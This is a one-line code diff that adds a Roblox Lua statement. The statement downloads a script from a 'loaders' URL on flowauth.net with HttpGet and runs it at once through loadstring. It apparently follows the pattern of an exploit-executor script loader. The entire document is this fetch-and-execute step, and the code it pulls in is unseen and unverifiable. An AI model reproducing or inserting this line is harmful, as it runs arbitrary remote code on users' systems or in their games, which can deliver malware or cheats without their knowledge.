@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://flowauth.net/v1/loaders/1be8f5030db46e660d561de8f6cf20bd.lua"))()
